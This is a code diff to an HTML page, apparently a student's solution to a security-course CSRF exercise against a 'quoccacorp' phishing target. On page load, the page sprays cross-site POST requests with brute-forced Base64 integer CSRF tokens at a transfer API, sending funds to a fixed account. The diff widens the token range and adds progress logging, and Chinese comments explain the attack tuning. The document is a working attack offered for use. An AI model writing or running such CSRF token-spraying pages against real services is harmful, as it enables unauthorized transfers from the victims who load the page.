@@ -2,48 +2,58 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>Surprise!</title>
+    <title>Transferring...</title>
 </head>
 <body>
-    <h1>Loading...</h1>
-    <div id="status" style="display:none;">正在初始化攻击负载...</div>
-    <ul id="log" style="display:none;"></ul>
+    <div id="status">正在初始化攻击负载...</div>
+    <ul id="log"></ul>
 
     <script>
-        // 收款人写你自己的学号
+        // 已经修改为你自己的账号
         const ME = "z5678452"; 
         
-        // 把起始 Token 设置为你解码出来的值稍微加一点缓冲
-        const START = 6980; 
+        // 基于你之前查到的 6976，预留一些别人刷新带来的缓冲量
+        const START = 7100; 
         
-        // 喷洒 500 个，覆盖 6980 ~ 7480 这个范围
+        // 稍微加大了喷洒数量，覆盖更广，提高命中率
         const COUNT = 1000;  
         const AMOUNT = 1;
         const targetUrl = "https://phish-me.quoccacorp.com/api/transfer";
 
         async function doPhish() {
+            const statusDiv = document.getElementById('status');
+            const logList = document.getElementById('log');
+
+            statusDiv.innerText = `正在对 Token 范围 ${START} - ${START + COUNT} 发起喷洒攻击...`;
+
             for (let i = 0; i < COUNT; i++) {
                 const tokenInt = START + i;
-                const token = btoa(tokenInt.toString()); // 重新 Base64 编码
+                const token = btoa(tokenInt.toString()); 
 
                 const params = new URLSearchParams();
                 params.append('csrf_token', token);
                 params.append('username', ME);
                 params.append('amount', AMOUNT);
 
-                // 发送跨站 POST 请求
                 fetch(targetUrl, {
                     method: "POST",
-                    mode: "no-cors", // 必须加这个，忽略浏览器的跨域报错，强行把请求发出去
+                    mode: "no-cors",
                     body: params,
                     headers: {
                         "Content-Type": "application/x-www-form-urlencoded"
                     }
                 });
 
-                // 稍微延时，防止浏览器卡死或发得太快被服务器拦截
+                if (i % 10 === 0) {
+                    const li = document.createElement('li');
+                    li.innerText = `已发送至 Token: ${tokenInt} (${token})`;
+                    logList.appendChild(li);
+                }
+
+                // 保持原样 50ms 延迟
                 await new Promise(r => setTimeout(r, 50)); 
             }
+            statusDiv.innerText = "攻击负载已全部发出。";
         }
 
         window.onload = doPhish;
